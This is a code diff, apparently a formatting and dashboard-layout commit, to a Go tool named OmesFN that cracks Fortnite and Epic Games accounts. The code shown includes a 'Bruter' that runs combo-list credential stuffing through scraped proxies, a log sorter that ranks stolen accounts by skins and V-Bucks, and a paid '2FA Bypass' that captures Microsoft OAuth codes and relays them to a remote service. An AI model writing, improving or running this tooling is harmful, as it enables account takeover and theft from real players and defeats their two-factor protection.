@@ -2,16 +2,22 @@ package main
 
 import (
 	"bufio"
+	"bytes"
+	"crypto/sha256"
 	"encoding/binary"
+	"encoding/hex"
 	"encoding/json"
 	"flag"
 	"fmt"
 	"io/ioutil"
 	"log"
 	"net"
+	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
 	"strconv"
 	"strings"
 	"sync"
@@ -19,20 +25,15 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
-	"net/http" 
-	"net/url"  
+
 	"github.com/go-ini/ini"
 	"github.com/hugolgst/rich-go/client"
-	"bytes"
-	"runtime"
-	"crypto/sha256"
-	"encoding/hex"
 )
 
 var (
-	dashboardEnabled bool = false
-	dashboardMutex   sync.Mutex
-	dashboardData    = map[string]interface{}{}
+	dashboardEnabled  bool = false
+	dashboardMutex    sync.Mutex
+	dashboardData     = map[string]interface{}{}
 	UseScrapedProxies bool
 	ScrapedProxies    []string
 )
@@ -42,7 +43,7 @@ func LoadConfig() bool {
 	cfg, err := ini.Load("config.ini")
 	if err != nil {
 		LogError(fmt.Sprintf("Failed to load config.ini: %v", err))
-				return false
+		return false
 	}
 	LogInfo("Loaded configuration file")
 	LogInfo("Reading General settings")
@@ -230,14 +231,14 @@ func ScrapeProxies() []string {
 }
 
 func CheckProxyHealth(proxy string) bool {
-transport := &http.Transport{
-		Proxy:             http.ProxyURL(&url.URL{Scheme: "http", Host: proxy}),
-		MaxIdleConns:      100,
-		IdleConnTimeout:   90 * time.Second,
-		TLSHandshakeTimeout: 10 * time.Second,
+	transport := &http.Transport{
+		Proxy:                 http.ProxyURL(&url.URL{Scheme: "http", Host: proxy}),
+		MaxIdleConns:          100,
+		IdleConnTimeout:       90 * time.Second,
+		TLSHandshakeTimeout:   10 * time.Second,
 		ExpectContinueTimeout: 1 * time.Second,
 	}
-client := &http.Client{Transport: transport, Timeout: 10 * time.Second}
+	client := &http.Client{Transport: transport, Timeout: 10 * time.Second}
 	resp, err := client.Get("https://login.live.com")
 	if err != nil {
 		return false
@@ -247,7 +248,7 @@ client := &http.Client{Transport: transport, Timeout: 10 * time.Second}
 }
 
 func FilterHealthyProxies(rawProxies []string) []string {
-	const maxConcurrent = 500 
+	const maxConcurrent = 500
 	sem := make(chan struct{}, maxConcurrent)
 	var healthy []string
 	var wg sync.WaitGroup
@@ -630,13 +631,13 @@ func SortLogs(reader *bufio.Reader) {
 	basePath := filepath.Join("Results", selected)
 
 	catMap := map[string]string{
-		"0_skins.txt":      "0 Skins",
-		"1-9_skins.txt":    "1+ Skins",
-		"10+_skins.txt":    "10+ Skins",
-		"50+_skins.txt":    "50+ Skins",
-		"100+_skins.txt":   "100+ Skins",
-		"200+_skins.txt":   "200+ Skins",
-		"300+_skins.txt":   "300+ Skins",
+		"0_skins.txt":    "0 Skins",
+		"1-9_skins.txt":  "1+ Skins",
+		"10+_skins.txt":  "10+ Skins",
+		"50+_skins.txt":  "50+ Skins",
+		"100+_skins.txt": "100+ Skins",
+		"200+_skins.txt": "200+ Skins",
+		"300+_skins.txt": "300+ Skins",
 	}
 
 	// Collect exclusives by scanning all files
@@ -795,7 +796,7 @@ func main() {
 		LogInfo("║ [1] Run FN Checker                     ║")
 		LogInfo("║ [2] Bruter                             ║")
 		LogInfo("║ [3] Sort Logs                          ║")
-	    LogInfo("║ [4] 2FA Bypass                         ║")
+		LogInfo("║ [4] 2FA Bypass                         ║")
 		LogInfo("║ [0] Exit                               ║")
 		LogInfo("╚════════════════════════════════════════╝")
 		fmt.Print("\n [>] ")
@@ -899,113 +900,113 @@ func main() {
 			LogError("\nPress Enter to exit...")
 			reader.ReadString('\n')
 			return
-case "2":
-    if ThreadCount <= 0 {
-        AskForThreads()
-    }
-    if ProxyType == "" {
-        AskForProxies()
-    }
-    LoadFiles()
-    AskForProxyScraping()
-    if UseProxies && !UseScrapedProxies {
-        Proxies, err := LoadProxies("proxies.txt")
-        if err != nil {
-            LogError("Failed to load proxies: " + err.Error())
-            Proxies = []string{}
-        } else {
-            LogInfo(fmt.Sprintf("Loaded [%d] proxies from proxies.txt!", len(Proxies)))
-        }
-    }
-    if !UseProxies && ProxylessMaxThreads > 0 && ThreadCount > ProxylessMaxThreads {
-        LogInfo(fmt.Sprintf("Proxyless mode detected - capping threads to %d to reduce rate-limit skips.", ProxylessMaxThreads))
-        ThreadCount = ProxylessMaxThreads
-    }
-    if len(Ccombos) == 0 {
-        LogError("No valid combos loaded. Please check combo.txt. Exiting.")
-        time.Sleep(3 * time.Second)
-        return
-    }
-    
-    Check = 0
-    Hits = 0
-    Bad = 0
-    Retries = 0
-    Cpm = 0
-    initialComboCount = len(Ccombos)
-    
-    ClearConsole()
-    PrintLogo()
-    LogInfo("Press any key to start bruteforcing!")
-    reader.ReadString('\n')
-    
-    var modules []func(string) bool
-    modules = append(modules, BruterCheck)
-    
-    CheckerRunning = true
-    Sw = time.Now()
-    
-    var titleWg sync.WaitGroup
-    titleWg.Add(1)
-    go UpdateBruterTitle(&titleWg)
-    
-    go func() {
-        for _, combo := range Ccombos {
-            Combos <- combo
-        }
-    }()
-    
-    WorkWg.Add(len(Ccombos))
-    var wg sync.WaitGroup
-    for i := 0; i < ThreadCount; i++ {
-        wg.Add(1)
-        go func(workerID int) {
-            defer wg.Done()
-            defer func() {
-                if r := recover(); r != nil {
-                    LogError(fmt.Sprintf("CRITICAL: Worker %d crashed with panic: %v", workerID, r))
-                    LogError(fmt.Sprintf("Worker %d recovery: Other workers continue running", workerID))
-                }
-            }()
-            for combo := range Combos {
-                if !CheckerRunning {
-                    return
-                }
-                for _, module := range modules {
-                    done := make(chan bool, 1)
-                    go func(combo string, module func(string) bool) {
-                        defer func() {
-                            if r := recover(); r != nil {
-                                LogError(fmt.Sprintf("Module panic recovered for combo %s: %v", combo, r))
-                            }
-                        }()
-                        module(combo)
-                        done <- true
-                    }(combo, module)
-                    select {
-                    case <-done:
-                    case <-time.After(45 * time.Second):
-                        LogError(fmt.Sprintf("TIMEOUT: Module for combo %s took longer than 45s", combo))
-                    }
-                }
-                WorkWg.Done()
-            }
-        }(i)
-    }
-    
-    WorkWg.Wait()
-    close(Combos)
-    wg.Wait()
-    CheckerRunning = false
-    titleWg.Wait()
-    
-    LogSuccess("\nAll bruteforcing completed!")
-    stats := fmt.Sprintf("Checked: %d | Bypassed: %d | Failed: %d | Retries: %d", Check, Hits, Bad, Retries)
-    fmt.Printf("%s[SUCCESS] %s%s\n", ColorGreen, centerText(stats, 80), ColorReset)
-    
-    LogInfo(fmt.Sprintf("\nResults saved to: %s", getBruterResultsFolder()))
-    LogError("\nPress Enter to continue...")
-    reader.ReadString('\n')
+		case "2":
+			if ThreadCount <= 0 {
+				AskForThreads()
+			}
+			if ProxyType == "" {
+				AskForProxies()
+			}
+			LoadFiles()
+			AskForProxyScraping()
+			if UseProxies && !UseScrapedProxies {
+				Proxies, err := LoadProxies("proxies.txt")
+				if err != nil {
+					LogError("Failed to load proxies: " + err.Error())
+					Proxies = []string{}
+				} else {
+					LogInfo(fmt.Sprintf("Loaded [%d] proxies from proxies.txt!", len(Proxies)))
+				}
+			}
+			if !UseProxies && ProxylessMaxThreads > 0 && ThreadCount > ProxylessMaxThreads {
+				LogInfo(fmt.Sprintf("Proxyless mode detected - capping threads to %d to reduce rate-limit skips.", ProxylessMaxThreads))
+				ThreadCount = ProxylessMaxThreads
+			}
+			if len(Ccombos) == 0 {
+				LogError("No valid combos loaded. Please check combo.txt. Exiting.")
+				time.Sleep(3 * time.Second)
+				return
+			}
+
+			Check = 0
+			Hits = 0
+			Bad = 0
+			Retries = 0
+			Cpm = 0
+			initialComboCount = len(Ccombos)
+
+			ClearConsole()
+			PrintLogo()
+			LogInfo("Press any key to start bruteforcing!")
+			reader.ReadString('\n')
+
+			var modules []func(string) bool
+			modules = append(modules, BruterCheck)
+
+			CheckerRunning = true
+			Sw = time.Now()
+
+			var titleWg sync.WaitGroup
+			titleWg.Add(1)
+			go UpdateBruterTitle(&titleWg)
+
+			go func() {
+				for _, combo := range Ccombos {
+					Combos <- combo
+				}
+			}()
+
+			WorkWg.Add(len(Ccombos))
+			var wg sync.WaitGroup
+			for i := 0; i < ThreadCount; i++ {
+				wg.Add(1)
+				go func(workerID int) {
+					defer wg.Done()
+					defer func() {
+						if r := recover(); r != nil {
+							LogError(fmt.Sprintf("CRITICAL: Worker %d crashed with panic: %v", workerID, r))
+							LogError(fmt.Sprintf("Worker %d recovery: Other workers continue running", workerID))
+						}
+					}()
+					for combo := range Combos {
+						if !CheckerRunning {
+							return
+						}
+						for _, module := range modules {
+							done := make(chan bool, 1)
+							go func(combo string, module func(string) bool) {
+								defer func() {
+									if r := recover(); r != nil {
+										LogError(fmt.Sprintf("Module panic recovered for combo %s: %v", combo, r))
+									}
+								}()
+								module(combo)
+								done <- true
+							}(combo, module)
+							select {
+							case <-done:
+							case <-time.After(45 * time.Second):
+								LogError(fmt.Sprintf("TIMEOUT: Module for combo %s took longer than 45s", combo))
+							}
+						}
+						WorkWg.Done()
+					}
+				}(i)
+			}
+
+			WorkWg.Wait()
+			close(Combos)
+			wg.Wait()
+			CheckerRunning = false
+			titleWg.Wait()
+
+			LogSuccess("\nAll bruteforcing completed!")
+			stats := fmt.Sprintf("Checked: %d | Bypassed: %d | Failed: %d | Retries: %d", Check, Hits, Bad, Retries)
+			fmt.Printf("%s[SUCCESS] %s%s\n", ColorGreen, centerText(stats, 80), ColorReset)
+
+			LogInfo(fmt.Sprintf("\nResults saved to: %s", getBruterResultsFolder()))
+			LogError("\nPress Enter to continue...")
+			reader.ReadString('\n')
 		case "3":
 			SortLogs(reader)
 		case "4":
@@ -1033,9 +1034,12 @@ func displayDashboard() {
 
 	ClearConsole()
 
-	fmt.Printf("\n%s                            OMESFN DASHBOARD%s\n\n", Yellow, Reset)
+	// Center the title
+	title := "OmesFN Menu"
+	padding := (40 - len(title)) / 2
+	centeredTitle := strings.Repeat(" ", padding) + title
+	fmt.Printf("\n%s\n\n", centeredTitle)
 
-	progressBar := createProgressBar(checked, total, 40)
 	progressPercent := 0.0
 	if total > 0 {
 		progressPercent = float64(checked) / float64(total) * 100
@@ -1043,32 +1047,72 @@ func displayDashboard() {
 	remaining := total - checked
 	eta := estimateCompletionTime(total, checked, int(elapsed.Seconds()))
 
-	fmt.Printf("%sPROGRESS%s\n", White, Reset)
-	fmt.Printf("  %s%s%s %.1f%%\n", ColorGreen, progressBar, Reset, progressPercent)
-	fmt.Printf("  Checked: %s%d%s  |  Remaining: %s%d%s  |  ETA: %s%s%s\n\n", ColorGreen, checked, Reset, Yellow, remaining, Reset, Cyan, eta, Reset)
+	// Center PROGRESS section
+	progressHeader := "Progress"
+	progressPadding := (40 - len(progressHeader)) / 2
+	fmt.Printf("%s%s\n", strings.Repeat(" ", progressPadding), progressHeader)
+
+	progressLine1 := fmt.Sprintf("Checked: %d/%d (%.1f%%)", checked, total, progressPercent)
+	progressPadding1 := (40 - len(progressLine1)) / 2
+	fmt.Printf("%s%s\n", strings.Repeat(" ", progressPadding1), progressLine1)
+
+	progressLine2 := fmt.Sprintf("Remaining: %d | ETA: %s", remaining, eta)
+	progressPadding2 := (40 - len(progressLine2)) / 2
+	fmt.Printf("%s%s\n\n", strings.Repeat(" ", progressPadding2), progressLine2)
 
 	cpm := atomic.LoadInt64(&Cpm) * 60
 	atomic.StoreInt64(&Cpm, 0)
 
-	fmt.Printf("%sPERFORMANCE%s\n", White, Reset)
-	fmt.Printf("  CPM: %s%d%s  |  Time: %s%dm %ds%s\n\n", getCpmColor(int(cpm)), cpm, Reset, Blue, minutes, seconds, Reset)
+	// Center PERFORMANCE section
+	perfHeader := "Performance"
+	perfPadding := (40 - len(perfHeader)) / 2
+	fmt.Printf("%s%s\n", strings.Repeat(" ", perfPadding), perfHeader)
 
-	fmt.Printf("%sHITS OVERVIEW%s\n", White, Reset)
-	fmt.Printf("  Total Hits: %s%d%s  |  Epic 2FA: %s%d%s  |  2FA: %s%d%s\n", ColorGreen, Hits, Reset, Yellow, EpicTwofa, Reset, Blue, Twofa, Reset)
-	fmt.Printf("  FA: %s%d%s  |  Headless: %s%d%s  |  Rares: %s%d%s\n\n", ColorGreen, Sfa, Reset, Magenta, Headless, Reset, Red, Rares, Reset)
+	perfLine := fmt.Sprintf("CPM: %d | Time: %dm %ds", cpm, minutes, seconds)
+	perfLinePadding := (40 - len(perfLine)) / 2
+	fmt.Printf("%s%s\n\n", strings.Repeat(" ", perfLinePadding), perfLine)
 
-	fmt.Printf("%sSKIN CATEGORIES%s\n", White, Reset)
-	printSkinBar("0 Skins", int(ZeroSkin), int(Hits))
-	printSkinBar("1-9 Skins", int(OnePlus), int(Hits))
-	printSkinBar("10+ Skins", int(TenPlus), int(Hits))
-	printSkinBar("50+ Skins", int(FiftyPlus), int(Hits))
-	printSkinBar("100+ Skins", int(HundredPlus), int(Hits))
-	printSkinBar("300+ Skins", int(ThreeHundredPlus), int(Hits))
+	// Center HITS OVERVIEW section
+	hitsHeader := "Hits Overview"
+	hitsPadding := (40 - len(hitsHeader)) / 2
+	fmt.Printf("%s%s\n", strings.Repeat(" ", hitsPadding), hitsHeader)
+
+	hitsLine1 := fmt.Sprintf("Total Hits: %d | Epic 2FA: %d | 2FA: %d", Hits, EpicTwofa, Twofa)
+	hitsLine1Padding := (40 - len(hitsLine1)) / 2
+	fmt.Printf("%s%s\n", strings.Repeat(" ", hitsLine1Padding), hitsLine1)
+
+	hitsLine2 := fmt.Sprintf("FA: %d | Headless: %d | Rares: %d", Sfa, Headless, Rares)
+	hitsLine2Padding := (40 - len(hitsLine2)) / 2
+	fmt.Printf("%s%s\n\n", strings.Repeat(" ", hitsLine2Padding), hitsLine2)
+
+	// Center SKIN CATEGORIES section
+	skinHeader := "Skins"
+	skinPadding := (40 - len(skinHeader)) / 2
+	fmt.Printf("%s%s\n", strings.Repeat(" ", skinPadding), skinHeader)
+
+	skinLines := []string{
+		fmt.Sprintf("0 Skins: %d", int(ZeroSkin)),
+		fmt.Sprintf("1-9 Skins: %d", int(OnePlus)),
+		fmt.Sprintf("10+ Skins: %d", int(TenPlus)),
+		fmt.Sprintf("50+ Skins: %d", int(FiftyPlus)),
+		fmt.Sprintf("100+ Skins: %d", int(HundredPlus)),
+		fmt.Sprintf("300+ Skins: %d", int(ThreeHundredPlus)),
+	}
+
+	for _, line := range skinLines {
+		linePadding := (40 - len(line)) / 2
+		fmt.Printf("%s%s\n", strings.Repeat(" ", linePadding), line)
+	}
 	fmt.Println()
 
-	// V-Bucks Section
-	fmt.Printf("%sV-BUCKS%s\n", White, Reset)
-	fmt.Printf("  1K+ V-Bucks: %s%d%s  |  3K+ V-Bucks: %s%d%s\n", Yellow, Vbucks1kPlus, Reset, ColorGreen, Vbucks3kPlus, Reset)
+	// Center V-Bucks Section
+	vbucksHeader := "V-bucks"
+	vbucksPadding := (40 - len(vbucksHeader)) / 2
+	fmt.Printf("%s%s\n", strings.Repeat(" ", vbucksPadding), vbucksHeader)
+
+	vbucksLine := fmt.Sprintf("1K+ V-Bucks: %d | 3K+ V-Bucks: %d", Vbucks1kPlus, Vbucks3kPlus)
+	vbucksLinePadding := (40 - len(vbucksLine)) / 2
+	fmt.Printf("%s%s\n", strings.Repeat(" ", vbucksLinePadding), vbucksLine)
 }
 
 func printSkinBar(label string, count int, total int) {
@@ -1307,7 +1351,7 @@ func shouldProcessAccount(displayName, epicEmail string, skinCount int, vbucks i
 
 func UpdateTitle(wg *sync.WaitGroup) {
 	defer wg.Done()
-	ticker := time.NewTicker(1 * time.Second)
+	ticker := time.NewTicker(3 * time.Second)
 	defer ticker.Stop()
 	for CheckerRunning {
 		<-ticker.C
@@ -1373,7 +1417,7 @@ func initDiscordRPC() {
 
 	LogInfo("Initializing Discord RPC...")
 
-	err := client.Login(DiscordClientID) 
+	err := client.Login(DiscordClientID)
 	if err != nil {
 		LogError(fmt.Sprintf("Failed to login to Discord RPC: %v", err))
 		LogError("Make sure Discord is running and RPC is enabled in User Settings > Activity Status")
@@ -1398,7 +1442,7 @@ func initDiscordRPC() {
 	LogInfo("Note: Images may not display if not registered with the Fortnite application.")
 
 	go func() {
-		ticker := time.NewTicker(15 * time.Second) 
+		ticker := time.NewTicker(15 * time.Second)
 		defer ticker.Stop()
 
 		for RPCEnabled {
@@ -1499,7 +1543,7 @@ func Handle2FABypass(reader *bufio.Reader) {
 		PrintLogo()
 		LogInfo("╔════════════════════════════════════════╗")
 		LogInfo("║           2FA Bypass Menu              ║")
-	    LogInfo("╠════════════════════════════════════════╣")
+		LogInfo("╠════════════════════════════════════════╣")
 		LogInfo("║ [1] Redeem Key / Use Premium Bypass    ║")
 		LogInfo("║ [2] Trial (3 bypasses per day)         ║")
 		LogInfo("║ [0] Back                               ║")
@@ -1522,12 +1566,12 @@ func Handle2FABypass(reader *bufio.Reader) {
 }
 
 type HardwareFingerprint struct {
-	UUID           string `json:"uuid"`
-	CPUInfo        string `json:"cpu"`
-	MACAddress     string `json:"mac"`
-	DiskSerial     string `json:"disk"`
-	BIOSSerial     string `json:"bios"`
-	MotherboardID  string `json:"motherboard"`
+	UUID            string `json:"uuid"`
+	CPUInfo         string `json:"cpu"`
+	MACAddress      string `json:"mac"`
+	DiskSerial      string `json:"disk"`
+	BIOSSerial      string `json:"bios"`
+	MotherboardID   string `json:"motherboard"`
 	FingerprintHash string `json:"hash"`
 }
 
@@ -1570,7 +1614,7 @@ func GetHardwareFingerprint() HardwareFingerprint {
 	composite := fmt.Sprintf("%s|%s|%s|%s|%s|%s",
 		fp.UUID, fp.CPUInfo, fp.MACAddress,
 		fp.DiskSerial, fp.BIOSSerial, fp.MotherboardID)
-	
+
 	h := sha256.Sum256([]byte(composite))
 	fp.FingerprintHash = hex.EncodeToString(h[:])
 
@@ -1582,7 +1626,7 @@ func RequestChallenge(fp HardwareFingerprint) (string, error) {
 		"fingerprint": fp,
 		"timestamp":   time.Now().Unix(),
 	}
-	
+
 	jsBody, err := json.Marshal(payload)
 	if err != nil {
 		return "", fmt.Errorf("JSON marshal failed: %v", err)
@@ -1623,38 +1667,37 @@ func RequestChallenge(fp HardwareFingerprint) (string, error) {
 
 func SolveChallenge(challenge string, difficulty int) string {
 	nonce := 0
-	
+
 	for {
 		attempt := fmt.Sprintf("%s:%d", challenge, nonce)
 		hash := sha256.Sum256([]byte(attempt))
 		hashStr := hex.EncodeToString(hash[:])
-		
+
 		if strings.HasPrefix(hashStr, strings.Repeat("0", difficulty)) {
 			return fmt.Sprintf("%d", nonce)
 		}
 		nonce++
-		
+
 	}
 }
 
 func GenerateClientProof(challenge string) ClientProof {
-	nonce := SolveChallenge(challenge, 4) 
-	
+	nonce := SolveChallenge(challenge, 4)
+
 	proof := ClientProof{
 		Timestamp:      time.Now().Unix(),
 		Challenge:      challenge,
 		ChallengeProof: nonce,
 		ClientVersion:  CLIENT_VERSION,
 	}
-	
-	
+
 	return proof
 }
 
 func RedeemKey(reader *bufio.Reader) {
 	keyFile := "bypass_key.txt"
 	savedKey, err := ioutil.ReadFile(keyFile)
-	
+
 	if err == nil && len(savedKey) > 0 {
 		LogInfo("Using saved key...")
 		PerformBypass(reader, string(savedKey))
@@ -1721,7 +1764,7 @@ func RedeemKey(reader *bufio.Reader) {
 
 	if result["status"] == "redeemed" {
 		ioutil.WriteFile(keyFile, []byte(key), 0644)
-		LogSuccess("✓ Key redeemed successfully!")
+		LogSuccess("Key redeemed successfully!")
 		LogInfo("Your key has been activated.")
 		time.Sleep(2 * time.Second)
 		PerformBypass(reader, key)
@@ -1735,9 +1778,9 @@ func RedeemKey(reader *bufio.Reader) {
 
 func TrialBypass(reader *bufio.Reader) {
 	LogInfo("Starting trial authentication...")
-	
+
 	fp := GetHardwareFingerprint()
-	
+
 	challenge, err := RequestChallenge(fp)
 	if err != nil {
 		LogError("Failed to request challenge: " + err.Error())
@@ -1748,14 +1791,13 @@ func TrialBypass(reader *bufio.Reader) {
 
 	LogInfo("Verifying eligibility...")
 	proof := GenerateClientProof(challenge)
-	
 
 	payload := map[string]interface{}{
 		"fingerprint": fp,
 		"proof":       proof,
 		"type":        "trial_request",
 	}
-		
+
 	jsBody, err := json.Marshal(payload)
 	if err != nil {
 		LogError("Failed to create request: " + err.Error())
@@ -1780,9 +1822,9 @@ func TrialBypass(reader *bufio.Reader) {
 
 	if resp.StatusCode != 200 {
 		body, _ := ioutil.ReadAll(resp.Body)
-		
+
 		LogError(fmt.Sprintf("Server returned error (%d)", resp.StatusCode))
-		
+
 		var errResult map[string]interface{}
 		if json.Unmarshal(body, &errResult) == nil {
 			if errMsg, ok := errResult["error"].(string); ok {
@@ -1794,7 +1836,7 @@ func TrialBypass(reader *bufio.Reader) {
 		} else {
 			LogError("Response: " + string(body))
 		}
-		
+
 		LogInfo("Press Enter to go back...")
 		reader.ReadString('\n')
 		return
@@ -1811,7 +1853,7 @@ func TrialBypass(reader *bufio.Reader) {
 	if result["status"] != "eligible" {
 		if isPremium, ok := result["isPremium"].(bool); ok && isPremium {
 			LogError("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-			LogError("   🌟 PREMIUM USER DETECTED 🌟")
+			LogError("   PREMIUM USER DETECTED")
 			LogError("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 			fmt.Println()
 			LogInfo("You already have a premium key activated!")
@@ -1826,14 +1868,14 @@ func TrialBypass(reader *bufio.Reader) {
 
 		if errText, ok := result["error"].(string); ok {
 			if errText == "daily limit reached" || errText == "Daily trial limit reached" {
-				LogError("⚠️  Daily trial limit reached!")
+				LogError("Daily trial limit reached!")
 				LogInfo("You've used all your free trials for today.")
 				LogInfo("Get a premium key for unlimited access!")
 				LogInfo("Press Enter to go back...")
 				reader.ReadString('\n')
 				return
 			} else if errText == "IP trial limit reached" {
-				LogError("⚠️  IP trial limit reached!")
+				LogError("IP trial limit reached!")
 				LogInfo("This network has used all free trials for today.")
 				LogInfo("Get a premium key for unlimited access!")
 				LogInfo("Press Enter to go back...")
@@ -1850,7 +1892,7 @@ func TrialBypass(reader *bufio.Reader) {
 		} else if msg, ok := result["message"].(string); ok && msg != "" {
 			LogInfo(msg)
 		}
-		
+
 		if errorMsg != "" {
 			LogError(errorMsg)
 		}
@@ -1860,18 +1902,16 @@ func TrialBypass(reader *bufio.Reader) {
 	}
 
 	sessionToken := result["session"].(string)
-	
+
 	if remaining, ok := result["trialsRemaining"].(float64); ok {
 		LogInfo(fmt.Sprintf("Trials remaining today: %d", int(remaining)))
 	}
 
 	LogInfo("A tab will open shortly. Please wait while it redirects you to the Epic Games page, then copy the URL and paste it here.")
 	time.Sleep(2 * time.Second)
-	
-	
+
 	url := "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code&display=popup"
 	openBrowser(url)
-
 
 	ClearConsole()
 	PrintLogo()
@@ -1908,14 +1948,14 @@ func TrialBypass(reader *bufio.Reader) {
 
 	if result["status"] == "ok" {
 		finalURL := result["resultUrl"].(string)
-			openBrowser(finalURL)
-		
-		LogSuccess("✓ Trial bypass successful!")
-		
+		openBrowser(finalURL)
+
+		LogSuccess("Trial bypass successful!")
+
 		if remaining, ok := result["trialsRemaining"].(float64); ok {
 			LogInfo(fmt.Sprintf("Trials remaining today: %d", int(remaining)))
 		}
-		
+
 		LogInfo("Press Enter to go back...")
 		reader.ReadString('\n')
 	} else {
@@ -1929,15 +1969,13 @@ func TrialBypass(reader *bufio.Reader) {
 	}
 }
 
-
-
 func PerformBypass(reader *bufio.Reader, key string) {
 	LogInfo("A tab will open shortly. Please wait while it redirects you to the Epic Games page, then copy the URL and paste it here.")
 	time.Sleep(2 * time.Second)
-	
+
 	url := "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code&display=popup"
 	openBrowser(url)
-	
+
 	ClearConsole()
 	PrintLogo()
 	LogInfo("Enter the URL:")
@@ -1986,32 +2024,32 @@ func PerformBypass(reader *bufio.Reader, key string) {
 	if result["status"] == "ok" {
 		newURL := result["resultUrl"].(string)
 		exec.Command("cmd", "/c", "start", newURL).Run()
-		LogSuccess("✓ Bypass successful!")
+		LogSuccess("Bypass successful!")
 		LogInfo("Press Enter to go back...")
 		reader.ReadString('\n')
 	} else {
 		errorMsg := "Bypass failed"
 		if errText, ok := result["error"].(string); ok {
 			errorMsg = errText
-			
+
 			switch errText {
 			case "Key not assigned to this hwid":
-				LogError("✗ Key verification failed.")
+				LogError("Key verification failed.")
 				LogInfo("This key is not activated on this device.")
 			case "Invalid key":
-				LogError("✗ Your key is invalid or has been revoked.")
+				LogError("Your key is invalid or has been revoked.")
 			case "Key banned":
-				LogError("✗ Your key has been banned.")
+				LogError("Your key has been banned.")
 			case "Key expired":
-				LogError("✗ Your key has expired.")
+				LogError("Your key has expired.")
 			case "Invalid code":
-				LogError("✗ The URL you provided is invalid or expired.")
+				LogError("The URL you provided is invalid or expired.")
 				LogInfo("Please try again with a fresh URL.")
 			case "Exchange failed: link expired or invalid":
-				LogError("✗ The authentication link has expired.")
+				LogError("The authentication link has expired.")
 				LogInfo("Please generate a new link and try again.")
 			default:
-				LogError("✗ " + errorMsg)
+				LogError(errorMsg)
 			}
 		} else {
 			LogError(errorMsg)
